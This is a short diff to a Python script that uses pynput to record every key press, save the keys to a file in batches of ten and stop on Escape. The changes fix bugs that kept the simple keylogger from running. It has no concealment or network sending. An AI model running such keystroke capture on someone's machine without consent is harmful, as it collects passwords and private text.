@@ -1,4 +1,3 @@
-import pynput
 from pynput.keyboard import Key, Listener
 
 count = 0
@@ -9,7 +8,7 @@ def on_press(key):
 
     keys.append(key)
     count += 1
-    #print("(0) pressed".format{key})
+    print("{0} pressed".format(key))
 
     if count >= 10:
         count = 0
@@ -23,7 +22,7 @@ def write_file(keys):
             f.write(str(key))
 
 def on_release(key):
-    if key == key.esc:
+    if key == Key.esc:
         return False
 
 with Listener(on_press=on_press, on_release=on_release) as listener:
